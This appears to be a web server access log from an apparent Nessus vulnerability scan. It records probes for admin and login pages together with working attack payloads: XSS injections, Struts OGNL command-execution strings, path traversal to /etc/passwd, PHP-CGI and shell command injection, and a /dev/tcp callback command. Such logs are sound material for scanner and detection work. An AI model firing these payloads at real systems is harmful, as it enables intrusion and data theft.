[2026-06-22T16:52:10.531Z] GET /rio2t8nr.jspa?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.533Z] GET /rio2t8nr.jspa?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.535Z] GET /rio2t8nr.kspx?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.537Z] GET /rio2t8nr.kspx?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.539Z] GET /rio2t8nr.mscgi?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.541Z] GET /rio2t8nr.mscgi?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.543Z] GET /rio2t8nr.do?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.545Z] GET /rio2t8nr.do?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.547Z] GET /rio2t8nr.htm?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.550Z] GET /rio2t8nr.htm?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.552Z] GET /rio2t8nr.idc?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.555Z] GET /rio2t8nr.idc?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.557Z] GET /rio2t8nr.x?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.559Z] GET /rio2t8nr.x?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.561Z] GET /<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.566Z] GET /?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.569Z] GET /<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.574Z] GET /?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:12.248Z] GET /cld/
[2026-06-22T16:52:12.354Z] GET /ConsoleHelp/default.jsp
[2026-06-22T16:52:12.424Z] GET /CFIDE/administrator/settings/version.cfm
[2026-06-22T16:52:12.494Z] GET /
[2026-06-22T16:52:12.575Z] GET /
[2026-06-22T16:52:12.669Z] GET /cmf/login
[2026-06-22T16:52:12.768Z] GET /clientaccesspolicy.xml
[2026-06-22T16:52:12.844Z] GET /
[2026-06-22T16:52:12.922Z] GET /Director
[2026-06-22T16:52:12.939Z] GET /DesktopDirector
[2026-06-22T16:52:13.048Z] GET /citrix/nfuse/default/login.asp?NFuse_LogoutId=&NFuse_MessageType=Error&NFuse_Message=<SCRIPT>alert('Ritchie')</SCRIPT>&ClientDetection=ON
[2026-06-22T16:52:13.487Z] GET /login
[2026-06-22T16:52:13.521Z] GET /vpn/
[2026-06-22T16:52:13.582Z] GET /client/
[2026-06-22T16:52:13.605Z] GET /login?redirects=10
[2026-06-22T16:52:13.660Z] GET /ControllerWeb/
[2026-06-22T16:52:13.695Z] GET /vsmc.html
[2026-06-22T16:52:13.770Z] GET /login
[2026-06-22T16:52:13.812Z] GET /app/ui/login.jsp
[2026-06-22T16:52:13.870Z] GET /ui/faces/Login.xhtml
[2026-06-22T16:52:13.874Z] GET /index.html
[2026-06-22T16:52:13.900Z] GET /getxml
[2026-06-22T16:52:13.989Z] GET /system.xml
[2026-06-22T16:52:14.034Z] GET /
[2026-06-22T16:52:14.096Z] GET /
[2026-06-22T16:52:14.119Z] GET /login.html
[2026-06-22T16:52:14.192Z] GET /cwhp/CSMSDesktop/about.jsp
[2026-06-22T16:52:14.198Z] GET /CSCOnm/servlet/login/login.jsp
[2026-06-22T16:52:14.208Z] GET /login?redirects=10
[2026-06-22T16:52:14.303Z] GET /lang_pack/EN.js
[2026-06-22T16:52:14.335Z] GET http://172.20.10.2:3000/authentication/login/
[2026-06-22T16:52:14.388Z] GET /login.jsp
[2026-06-22T16:52:14.434Z] GET /CSCOnm/servlet/login/login.jsp
[2026-06-22T16:52:14.509Z] GET /api/config/class/guis
[2026-06-22T16:52:14.556Z] GET /about.jsp
[2026-06-22T16:52:14.600Z] GET /admin/login.jsp
[2026-06-22T16:52:14.652Z] GET /restconf
[2026-06-22T16:52:14.715Z] GET /login.html
[2026-06-22T16:52:14.794Z] GET /login?redirects=10
[2026-06-22T16:52:14.830Z] GET /
[2026-06-22T16:52:14.895Z] GET /
[2026-06-22T16:52:14.912Z] GET /csamc52/webadmin?page=invalid&type=browser
[2026-06-22T16:52:14.979Z] GET /admin/public/index.html
[2026-06-22T16:52:15.002Z] GET /login.html
[2026-06-22T16:52:15.058Z] GET /+CSCOE+/logon.html
[2026-06-22T16:52:15.110Z] GET /
[2026-06-22T16:52:15.238Z] GET /nls/ApplicationProperties-en.json
[2026-06-22T16:52:15.276Z] GET /securecgi-bin/CSUserCGI.exe?ver
[2026-06-22T16:52:15.291Z] GET /securecgi-bin/CSUserCGI.exe?Init+0
[2026-06-22T16:52:15.344Z] GET /changelog
[2026-06-22T16:52:15.481Z] GET /version
[2026-06-22T16:52:15.601Z] GET /version
[2026-06-22T16:52:15.729Z] GET /Login.aspx
[2026-06-22T16:52:15.732Z] GET /admin/
[2026-06-22T16:52:15.863Z] GET /
[2026-06-22T16:52:15.982Z] GET /cacti
[2026-06-22T16:52:16.070Z] GET /MM/
[2026-06-22T16:52:16.161Z] GET /login.html
[2026-06-22T16:52:16.244Z] GET /%NETHOOD%/
[2026-06-22T16:52:16.309Z] GET /nosuchfile-1287885434-615803113.jsp
[2026-06-22T16:52:16.449Z] GET /self_upgrade.html
[2026-06-22T16:52:16.483Z] GET /webapps/login/index.html
[2026-06-22T16:52:16.487Z] GET /webct/about.jsp
[2026-06-22T16:52:16.568Z] GET /forum.php
[2026-06-22T16:52:16.615Z] GET /bitrix/admin/index.php?lang=en
[2026-06-22T16:52:16.713Z] GET /WS2020/Default.aspx
[2026-06-22T16:52:16.741Z] GET /WS2021/Default.aspx
[2026-06-22T16:52:16.744Z] GET /WS2022/Default.aspx
[2026-06-22T16:52:16.748Z] GET /WS2023/Default.aspx
[2026-06-22T16:52:16.936Z] GET /
[2026-06-22T16:52:16.992Z] GET /
[2026-06-22T16:52:17.052Z] GET /login
[2026-06-22T16:52:17.163Z] GET /cgi-mod/index.cgi
[2026-06-22T16:52:17.225Z] GET /cgi-bin/index.cgi
[2026-06-22T16:52:17.282Z] GET /header.php
[2026-06-22T16:52:17.417Z] GET /.htaccess.old
[2026-06-22T16:52:17.425Z] GET /.htaccess.bak
[2026-06-22T16:52:17.427Z] GET /.htaccess~
[2026-06-22T16:52:17.429Z] GET /.htaccess.copy
[2026-06-22T16:52:17.432Z] GET /.htaccess.tmp
[2026-06-22T16:52:17.434Z] GET /..htaccess.swp
[2026-06-22T16:52:17.436Z] GET /.htaccess.1
[2026-06-22T16:52:17.439Z] GET /.htaccess.~1~
[2026-06-22T16:52:17.588Z] GET /login
[2026-06-22T16:52:17.725Z] GET /cgi-bin/kvm.cgi?&file=login
[2026-06-22T16:52:17.745Z] GET /login
[2026-06-22T16:52:17.837Z] GET /
[2026-06-22T16:52:17.839Z] GET /html/nhome.html
[2026-06-22T16:52:17.843Z] GET /api/hpe-restapi.json
[2026-06-22T16:52:17.845Z] GET /jscripts/app.js
[2026-06-22T16:52:17.997Z] GET /snmx-cgi/fxm.exe
[2026-06-22T16:52:18.058Z] GET /web/#/login
[2026-06-22T16:52:18.148Z] GET /platform-ui/
[2026-06-22T16:52:18.207Z] GET /management/
[2026-06-22T16:52:18.293Z] GET /
[2026-06-22T16:52:18.382Z] GET /arcgis/rest/info?f=json
[2026-06-22T16:52:18.476Z] GET /server-info
[2026-06-22T16:52:18.616Z] GET /index.html
[2026-06-22T16:52:18.714Z] GET /login/
[2026-06-22T16:52:18.793Z] GET /
[2026-06-22T16:52:18.876Z] GET /
[2026-06-22T16:52:18.967Z] GET /roller-ui/login.rol
[2026-06-22T16:52:19.051Z] GET /
[2026-06-22T16:52:19.136Z] GET /pluto/portal/
[2026-06-22T16:52:19.215Z] GET /nifi/
[2026-06-22T16:52:29.440Z] GET /
[2026-06-22T16:52:34.536Z] GET /
[2026-06-22T16:52:39.355Z] GET /
[2026-06-22T16:52:49.559Z] GET /
[2026-06-22T16:54:15.846Z] GET /
[2026-06-22T16:55:06.029Z] GET /kylin/api/admin/version
[2026-06-22T16:55:06.123Z] GET /translations/en.json
[2026-06-22T16:55:06.192Z] GET /
[2026-06-22T16:55:06.258Z] GET /unified-console.html
[2026-06-22T16:55:06.353Z] GET /login/
[2026-06-22T16:55:06.356Z] GET /admin/airflow/login
[2026-06-22T16:55:06.453Z] GET /api/v1/?format=api
[2026-06-22T16:55:06.518Z] GET /api/v1/?format=api
[2026-06-22T16:55:06.585Z] GET /#login
[2026-06-22T16:55:06.662Z] GET //
[2026-06-22T16:55:06.725Z] GET /libs/granite/core/content/login.html
[2026-06-22T16:55:06.789Z] GET /system/login
[2026-06-22T16:55:06.854Z] GET /system/login
[2026-06-22T16:55:06.989Z] GET /courier/web/1000@/wmLogin.html
[2026-06-22T16:55:07.080Z] GET /
[2026-06-22T16:55:07.174Z] GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service=
[2026-06-22T16:55:07.197Z] GET /chassis/config/GeneralChassisConfig.html
[2026-06-22T16:55:07.301Z] GET /this_page_should_not_exist.htm
[2026-06-22T16:55:07.418Z] GET /qwe/qwe/index.html
[2026-06-22T16:55:09.613Z] GET /favicon2.iso
[2026-06-22T16:55:09.622Z] GET /favicon.iso
[2026-06-22T16:55:19.839Z] GET /
[2026-06-22T16:55:19.930Z] GET /ajax-api/2.0/mlflow/registered-models/search?order_by=name+ASC
[2026-06-22T16:55:20.001Z] GET /
[2026-06-22T16:55:35.145Z] GET /info
[2026-06-22T16:55:35.186Z] GET /play
[2026-06-22T16:56:03.856Z] GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus%22%3e%3cscript%3ealert%28%27websense_username_xss.nasl%27%29%3c%2fscript%3e
[2026-06-22T16:56:03.929Z] GET /webhost
[2026-06-22T16:56:04.013Z] GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e
[2026-06-22T16:56:04.043Z] GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e
[2026-06-22T16:56:04.166Z] GET /?"><script>alert('struts_sa_surl_xss.nasl-1782147364')</script>
[2026-06-22T16:56:04.242Z] GET /_mem_bin/formslogin.asp?url=><script>alert('Vulnerable');</script>
[2026-06-22T16:56:04.297Z] GET /LoginPage.do
[2026-06-22T16:56:04.371Z] GET /home.jsf?autoScroll=0%2c275%29%3b%2f%2f--%3e%3c%2fscript%3e%3cscript%3ealert%28%27myfaces_tomahawk_autoscroll_xss.nasl%27
[2026-06-22T16:56:04.477Z] GET /index.aspx
[2026-06-22T16:56:04.498Z] GET /Default.aspx
[2026-06-22T16:56:04.633Z] GET /item.fts?href=%22%3E%3Cscript%3Ealert%28%22ftgate_44002.nasl%22%29%3C%2Fscript%3E%3B
[2026-06-22T16:56:04.707Z] GET /login?user=**%3Cscript%3EJavaScript:alert('cpanel_login_user_xss.nasl')%3B%3C%2Fscript%3E
[2026-06-22T16:56:04.803Z] GET /admin/statistics/ConfigureStatistics
[2026-06-22T16:56:04.883Z] GET /altercast/AlterCast?op=%3cscript%3ealert%28%22adobe_document_server_61.nasl%22%29%3c%2fscript%3e
[2026-06-22T16:56:04.959Z] GET /nul.dbm
[2026-06-22T16:56:05.224Z] GET /s/cfx/_/;/WEB-INF/web.xml
[2026-06-22T16:56:05.233Z] GET /s/cfx/_/;/WEB-INF/classes/seraph-config.xml
[2026-06-22T16:56:05.236Z] GET /s/cfx/_/;/WEB-INF/decorators.xml
[2026-06-22T16:56:05.239Z] GET /s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
[2026-06-22T16:56:05.261Z] GET /s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
[2026-06-22T16:56:05.277Z] GET /s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
[2026-06-22T16:56:05.281Z] GET /s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
[2026-06-22T16:56:05.714Z] GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini
[2026-06-22T16:56:05.828Z] GET /index.jsp
[2026-06-22T16:56:05.831Z] GET /index.jsp
[2026-06-22T16:56:05.948Z] GET /web.config
[2026-06-22T16:56:06.017Z] GET /scripts/w3who.dll
[2026-06-22T16:56:06.077Z] GET /cgi-bin/filescan
[2026-06-22T16:56:06.145Z] GET /enter.php?goto=%2F
[2026-06-22T16:56:06.196Z] GET /Reporting/login/change_password.php?enable_auth=0
[2026-06-22T16:56:06.258Z] GET /struts/webconsole.html
[2026-06-22T16:56:06.338Z] GET /
[2026-06-22T16:56:06.341Z] GET /
[2026-06-22T16:56:06.502Z] POST /
[2026-06-22T16:56:06.594Z] GET /
[2026-06-22T16:56:06.597Z] GET /?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1782147366
[2026-06-22T16:56:06.698Z] GET //${301569515+5}.action
[2026-06-22T16:56:06.700Z] GET //${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.print('Nessus%20Response:%20'),%23w.println('struts_2_3_14_3_command_execution-301569515'),%23w.flush(),%23w.close()}.action
[2026-06-22T16:56:06.813Z] GET //struts/webconsole.html
[2026-06-22T16:56:06.878Z] GET /sc3/console.php?psid=101
[2026-06-22T16:56:06.969Z] GET /
[2026-06-22T16:56:07.066Z] GET /.anydomain.test
[2026-06-22T16:56:07.139Z] GET /etc/mnt_info.csv
[2026-06-22T16:56:07.223Z] POST /javax.faces.resource/dynamiccontent.properties.xhtml
[2026-06-22T16:56:07.288Z] GET /dagent/checkprofile.asp?agentid=11111'plus_agentid_sql_injection.nasl
[2026-06-22T16:56:07.359Z] POST /%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e
[2026-06-22T16:56:07.473Z] GET /login_up.php3?login_name=x&passwd=x&locale_id=../../../../../../../../../../../../boot.ini%00.jpg
[2026-06-22T16:56:07.527Z] GET /php/php.exe?c:\winnt\win.ini
[2026-06-22T16:56:07.585Z] GET /
[2026-06-22T16:56:07.588Z] GET /
[2026-06-22T16:56:07.775Z] GET /.well-known/jwks.json
[2026-06-22T16:56:07.783Z] GET /jwks.json
[2026-06-22T16:56:07.786Z] GET /.well-known/jwks
[2026-06-22T16:56:07.788Z] GET /api/.well-known/jwks.json
[2026-06-22T16:56:07.791Z] GET /auth/.well-known/jwks.json
[2026-06-22T16:56:07.794Z] GET /oauth/.well-known/jwks.json
[2026-06-22T16:56:07.797Z] GET /oauth2/.well-known/jwks.json
[2026-06-22T16:56:07.799Z] GET /.well-known/oauth/jwks.json
[2026-06-22T16:56:07.803Z] GET /v1/.well-known/jwks.json
[2026-06-22T16:56:08.147Z] GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none
[2026-06-22T16:56:13.346Z] POST /OA_HTML/configurator/UiServlet
[2026-06-22T16:56:26.099Z] GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id|
[2026-06-22T16:56:26.166Z] GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10
[2026-06-22T16:56:26.227Z] GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf
[2026-06-22T16:56:36.457Z] GET /api/getServices?name[]=$(/bin/bash%20-c%20%22nslookup%20log4shell-generic-5sjzT44xMDdaMRIie18dten.w.nessus.org)
[2026-06-22T16:56:41.584Z] GET /api/getServices?name[]=$(bash%20-c%20%22echo%20exploited_port[3000]by_nessus%20%3E/dev/tcp/172.20.10.2/51622")
[2026-06-22T16:57:40.167Z] GET /axis2/services/CUPMService/ping
[2026-06-22T16:57:40.169Z] GET /dfcweb/lib/cupm/nls/applicationproperties.js
[2026-06-22T16:57:40.270Z] GET /emsam/index.html
[2026-06-22T16:58:18.577Z] GET /SMB/console/html/cgi/cgiChkMasterPwd.exe
[2026-06-22T16:58:26.882Z] GET /login.php
[2026-06-22T16:58:33.279Z] GET /
[2026-06-22T17:02:33.992Z] GET /?tag=tenable-296195195&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close
[2026-06-22T17:02:34.128Z] GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'ipconfig'})).start()}
[2026-06-22T17:02:34.136Z] GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201782147754%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()}
[2026-06-22T17:02:39.155Z] GET /?redirect:%24%7B57550614%2b16044095%7D
[2026-06-22T17:03:09.377Z] GET //${%23context['xwork.MethodAccessor.denyMethodExecution']=!(%23_memberAccess['allowStaticMethodAccess']=true),(@java.lang.Runtime@getRuntime()).exec('ipconfig').waitFor()}.action
[2026-06-22T17:03:09.677Z] POST /flex2gateway/http
[2026-06-22T17:03:09.685Z] POST /messagebroker/http
[2026-06-22T17:03:09.689Z] POST /blazeds/messagebroker/http
[2026-06-22T17:03:09.691Z] POST /lcds/messagebroker/http
[2026-06-22T17:03:09.694Z] POST /flex2gateway/http
[2026-06-22T17:03:09.697Z] POST /messagebroker/http
[2026-06-22T17:03:09.700Z] POST /blazeds/messagebroker/http
[2026-06-22T17:03:09.703Z] POST /lcds/messagebroker/http
[2026-06-22T17:03:10.138Z] GET /internalServerReporting.php
[2026-06-22T17:03:15.343Z] GET /././..
[2026-06-22T17:03:15.418Z] GET /1782147795-mongoose_trailing_slash_disclosure.nasl
[2026-06-22T17:03:15.498Z] GET /version
[2026-06-22T17:03:15.593Z] GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini
[2026-06-22T17:03:15.596Z] GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini
[2026-06-22T17:03:15.599Z] GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
[2026-06-22T17:03:15.749Z] GET /search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini
[2026-06-22T17:03:15.758Z] GET /search?NS-query-pat=../../../../../../../../../etc/passwd
[2026-06-22T17:03:15.877Z] GET /ifx/?LO=../../../../../etc/passwd
[2026-06-22T17:03:15.954Z] GET /status.xsl.
[2026-06-22T17:03:16.048Z] GET /U5smgrwJatZN
[2026-06-22T17:03:16.051Z] PUT /U5smgrwJatZN
[2026-06-22T17:03:16.054Z] GET /U5smgrwJatZN
[2026-06-22T17:03:16.660Z] POST /vendor/htmlawed/htmlawed/htmLawedTest.php
[2026-06-22T17:03:16.670Z] POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php
[2026-06-22T17:03:16.787Z] GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
[2026-06-22T17:03:16.863Z] POST /FormHandler.cgi
[2026-06-22T17:03:16.937Z] GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
[2026-06-22T17:03:16.981Z] POST http://127.0.0.1/iControl/iControlPortal.cgi
[2026-06-22T17:03:17.058Z] GET /DB4Web/DESKTOP-T6B5C8A:23/foo
[2026-06-22T17:03:17.135Z] GET /WebInterface/
[2026-06-22T17:03:17.212Z] GET /WebInterface
[2026-06-22T17:03:17.284Z] GET /CFIDE/administrator/index.cfm
[2026-06-22T17:03:17.399Z] GET /backend/settings/oauth_adfs?hostname=172.20.10.2
[2026-06-22T17:03:17.488Z] GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&downloadDirectory=..\..\..\Windows\System32\drivers\etc\&readmeText=1
[2026-06-22T17:03:17.566Z] GET /dev/
[2026-06-22T17:03:17.640Z] GET /gui/
[2026-06-22T17:03:17.739Z] GET /gui/
[2026-06-22T17:03:17.814Z] GET /axis/DirectDownload.jsp
[2026-06-22T17:03:18.632Z] GET /
[2026-06-22T17:03:18.641Z] GET /_mt/mt.cgi
[2026-06-22T17:03:18.644Z] GET /admin.cgi
[2026-06-22T17:03:18.647Z] GET /administrator.cgi
[2026-06-22T17:03:18.649Z] GET /buglist.cgi
[2026-06-22T17:03:18.652Z] GET /cgi/mid.cgi
[2026-06-22T17:03:18.654Z] GET /cgi-bin/admin
[2026-06-22T17:03:18.657Z] GET /cgi-bin/admin.cgi
[2026-06-22T17:03:18.659Z] GET /cgi-bin/admin.pl
[2026-06-22T17:03:18.662Z] GET /cgi-bin/administrator
[2026-06-22T17:03:18.665Z] GET /cgi-bin/administrator.cgi
[2026-06-22T17:03:18.668Z] GET /cgi-bin/agorn.cgi
[2026-06-22T17:03:18.671Z] GET /cgi-bin/bugreport.cgi
[2026-06-22T17:03:18.674Z] GET /cgi-bin/cart.cgi
[2026-06-22T17:03:18.677Z] GET /cgi-bin/clwarn.cgi
[2026-06-22T17:03:18.680Z] GET /cgi-bin/count.cgi
[2026-06-22T17:03:18.683Z] GET /cgi-bin/Count.cgi
[2026-06-22T17:03:18.686Z] GET /cgi-bin/faqmanager.cgi
[2026-06-22T17:03:18.689Z] GET /cgi-bin/FormHandler.cgi
[2026-06-22T17:03:18.692Z] GET /cgi-bin/FormMail.cgi
[2026-06-22T17:03:18.695Z] GET /cgi-bin/guestbook.cgi
[2026-06-22T17:03:18.698Z] GET /cgi-bin/help.cgi
[2026-06-22T17:03:18.701Z] GET /cgi-bin/hi
[2026-06-22T17:03:18.703Z] GET /cgi-bin/index.cgi
[2026-06-22T17:03:18.706Z] GET /cgi-bin/index.pl
[2026-06-22T17:03:18.709Z] GET /cgi-bin/index.sh
[2026-06-22T17:03:18.712Z] GET /cgi-bin/login
[2026-06-22T17:03:18.715Z] GET /cgi-bin/login.cgi
[2026-06-22T17:03:18.718Z] GET /cgi-bin/mailit.pl
[2026-06-22T17:03:18.720Z] GET /cgi-bin/mt/mt-check.cgi
[2026-06-22T17:03:18.722Z] GET /cgi-bin/mt/mt-load.cgi
[2026-06-22T17:03:18.725Z] GET /cgi-bin/mt-static/mt-check.cgi
[2026-06-22T17:03:18.728Z] GET /cgi-bin/mt-static/mt-load.cgi
[2026-06-22T17:03:18.730Z] GET /cgi-bin/ncbook/book.cgi
[2026-06-22T17:03:18.733Z] GET /cgi-bin/printenv
[2026-06-22T17:03:18.736Z] GET /cgi-bin/printenv.cgi
[2026-06-22T17:03:18.738Z] GET /cgi-bin/quickstore.cgi
[2026-06-22T17:03:18.741Z] GET /cgi-bin/search
[2026-06-22T17:03:18.744Z] GET /cgi-bin/search.cgi
[2026-06-22T17:03:18.747Z] GET /cgi-bin/search/search.cgi
[2026-06-22T17:03:18.749Z] GET /cgi-bin/status
[2026-06-22T17:03:18.752Z] GET /cgi-bin/status.cgi
[2026-06-22T17:03:18.755Z] GET /cgi-bin/test.cgi
[2026-06-22T17:03:18.757Z] GET /cgi-bin/test.sh
[2026-06-22T17:03:18.759Z] GET /cgi-bin/test-cgi
[2026-06-22T17:03:18.763Z] GET /cgi-bin/upload.cgi
[2026-06-22T17:03:18.766Z] GET /cgi-bin/urlcount.cgi
[2026-06-22T17:03:18.768Z] GET /cgi-bin/viewcvs.cgi
[2026-06-22T17:03:18.771Z] GET /cgi-bin/wa
[2026-06-22T17:03:18.773Z] GET /cgi-bin/wa.cgi
[2026-06-22T17:03:18.776Z] GET /cgi-bin/wa.exe
[2026-06-22T17:03:18.779Z] GET /cgi-bin/whois.cgi
[2026-06-22T17:03:18.782Z] GET /cgi-bin-sdb/printenv
[2026-06-22T17:03:18.785Z] GET /cgi-mod/index.cgi
[2026-06-22T17:03:18.787Z] GET /cgi-sys/defaultwebpage.cgi
[2026-06-22T17:03:18.790Z] GET /cgi-sys/entropysearch.cgi
[2026-06-22T17:03:18.793Z] GET /index.cgi
[2026-06-22T17:03:18.796Z] GET /index.pl
[2026-06-22T17:03:18.799Z] GET /index.sh
[2026-06-22T17:03:18.802Z] GET /nph-mr.cgi
[2026-06-22T17:03:18.804Z] GET /query.cgi
[2026-06-22T17:03:18.807Z] GET /session_login.cgi
[2026-06-22T17:03:18.809Z] GET /show_bug.cgi
[2026-06-22T17:03:18.813Z] GET /test
[2026-06-22T17:03:18.816Z] GET /test.cgi
[2026-06-22T17:03:18.818Z] GET /ucsm/isSamInstalled.cgi
[2026-06-22T17:03:18.821Z] GET /whois.cgi
[2026-06-22T17:03:18.824Z] GET /wp-login.php
[2026-06-22T17:03:18.826Z] GET /wwwadmin.cgi
[2026-06-22T17:03:18.829Z] GET /wwwboard.cgi
[2026-06-22T17:03:18.832Z] GET /xampp/cgi.cgi
[2026-06-22T17:03:21.985Z] GET /
[2026-06-22T17:03:21.994Z] GET /_mt/mt.cgi
[2026-06-22T17:03:21.996Z] GET /admin.cgi
[2026-06-22T17:03:21.999Z] GET /administrator.cgi
[2026-06-22T17:03:22.001Z] GET /buglist.cgi
[2026-06-22T17:03:22.004Z] GET /cgi/mid.cgi
[2026-06-22T17:03:22.006Z] GET /cgi-bin/admin
[2026-06-22T17:03:22.008Z] GET /cgi-bin/admin.cgi
[2026-06-22T17:03:22.012Z] GET /cgi-bin/admin.pl
[2026-06-22T17:03:22.014Z] GET /cgi-bin/administrator
[2026-06-22T17:03:22.017Z] GET /cgi-bin/administrator.cgi
[2026-06-22T17:03:22.019Z] GET /cgi-bin/agorn.cgi
[2026-06-22T17:03:22.022Z] GET /cgi-bin/bugreport.cgi
[2026-06-22T17:03:22.025Z] GET /cgi-bin/cart.cgi
[2026-06-22T17:03:22.028Z] GET /cgi-bin/clwarn.cgi
[2026-06-22T17:03:22.032Z] GET /cgi-bin/count.cgi
[2026-06-22T17:03:22.034Z] GET /cgi-bin/Count.cgi
[2026-06-22T17:03:22.037Z] GET /cgi-bin/faqmanager.cgi
[2026-06-22T17:03:22.039Z] GET /cgi-bin/FormHandler.cgi
[2026-06-22T17:03:22.043Z] GET /cgi-bin/FormMail.cgi
[2026-06-22T17:03:22.046Z] GET /cgi-bin/guestbook.cgi
[2026-06-22T17:03:22.049Z] GET /cgi-bin/help.cgi
[2026-06-22T17:03:22.051Z] GET /cgi-bin/hi
[2026-06-22T17:03:22.054Z] GET /cgi-bin/index.cgi
[2026-06-22T17:03:22.056Z] GET /cgi-bin/index.pl
[2026-06-22T17:03:22.059Z] GET /cgi-bin/index.sh
[2026-06-22T17:03:22.062Z] GET /cgi-bin/login.cgi
[2026-06-22T17:03:22.065Z] GET /cgi-bin/mailit.pl
[2026-06-22T17:03:22.067Z] GET /cgi-bin/mt/mt-check.cgi
[2026-06-22T17:03:22.070Z] GET /cgi-bin/mt/mt-load.cgi
[2026-06-22T17:03:22.072Z] GET /cgi-bin/mt-static/mt-check.cgi
[2026-06-22T17:03:22.075Z] GET /cgi-bin/mt-static/mt-load.cgi
[2026-06-22T17:03:22.077Z] GET /cgi-bin/ncbook/book.cgi
[2026-06-22T17:03:22.080Z] GET /cgi-bin/printenv
[2026-06-22T17:03:22.083Z] GET /cgi-bin/printenv.cgi
[2026-06-22T17:03:22.085Z] GET /cgi-bin/quickstore.cgi
[2026-06-22T17:03:22.088Z] GET /cgi-bin/search
[2026-06-22T17:03:22.090Z] GET /cgi-bin/search.cgi
[2026-06-22T17:03:22.093Z] GET /cgi-bin/search/search.cgi
[2026-06-22T17:03:22.096Z] GET /cgi-bin/status
[2026-06-22T17:03:22.098Z] GET /cgi-bin/status.cgi
[2026-06-22T17:03:22.101Z] GET /cgi-bin/test.cgi
[2026-06-22T17:03:22.104Z] GET /cgi-bin/test.sh
[2026-06-22T17:03:22.107Z] GET /cgi-bin/test-cgi
[2026-06-22T17:03:22.110Z] GET /cgi-bin/upload.cgi
[2026-06-22T17:03:22.113Z] GET /cgi-bin/urlcount.cgi
[2026-06-22T17:03:22.115Z] GET /cgi-bin/viewcvs.cgi
